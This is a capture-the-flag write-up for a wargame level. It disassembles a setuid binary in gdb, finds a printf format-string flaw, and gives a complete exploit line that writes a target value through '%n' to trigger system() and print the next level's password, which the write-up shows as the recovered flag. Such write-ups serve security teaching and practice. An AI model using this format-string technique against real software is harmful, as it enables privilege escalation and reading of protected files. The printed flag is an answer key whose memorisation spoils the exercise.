```shell
$> ls -la
[...]
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
[...]

$> ./level4
input:  test
output: test

# program asks for input and shows it back
```

```shell
$> gdb level4
(gdb) disas main
    [...]
    0x080484ad <+6>:     call   0x8048457 <n>
    [...]

# it call function n()

(gdb) set disassembly-flavor intel
(gdb) disas n
    [...]
    0x08048460 <+9>:     mov    eax,ds:0x8049804            #1
    [...]
    0x08048471 <+26>:    lea    eax,[ebp-0x208]             #2
    0x08048477 <+32>:    mov    DWORD PTR [esp],eax
    0x0804847a <+35>:    call   0x8048350 <fgets@plt>
    0x0804847f <+40>:    lea    eax,[ebp-0x208]             #3
    0x08048485 <+46>:    mov    DWORD PTR [esp],eax
    0x08048488 <+49>:    call   0x8048444 <p>
    0x0804848d <+54>:    mov    eax,ds:0x8049810            #4
    0x08048492 <+59>:    cmp    eax,0x1025544
    0x08048497 <+64>:    jne    0x80484a5 <n+78>
    0x08048499 <+66>:    mov    DWORD PTR [esp],0x8048590   #5
    0x080484a0 <+73>:    call   0x8048360 <system@plt>
    [...]

#1: the buffer.
#2: same as level3
#3: same as level3 but it calls the printf() in p() (#3.1)
#4: same as level3 but it compares with 0x1025544 (16930116)
#5: same as level3 but it calls system("/bin/cat /home/user/level5/.pass" (#5.1)) so it will print directly the flag.

#3.1:
(gdb) disas p
[...]
0x08048450 <+12>:    call   0x8048340 <printf@plt>
[...]

#5.1:
(gdb) x /s 0x8048590
0x8048590:       "/bin/cat /home/user/level5/.pass"
```

As level3, we need to use the vulnerability of the printf() function.
And change the value of m to 0x1025544 (16930116).

```shell
$> ./level4
input:  aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
output: aaaa [...] 0x61616161 [...]

# the offset value is at the 12th position.

$> python -c "print '\x10\x98\x04\x08' + '%16930112d%12\$n'" > /tmp/exploit

# '\x10\x98\x04\x08': address of m
# %16930112d: because padding of 16930112 bytes is too bigger so here we use %d format to pad the value.
# %n: format of printf(), add lenght of previous string to the offset.
# 12$: index of the offset

$> cat /tmp/exploit | ./level4
   [...]   -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

# we don't need to execute in interactive mode (cat -) because here use /bin/cat to get flag.
```
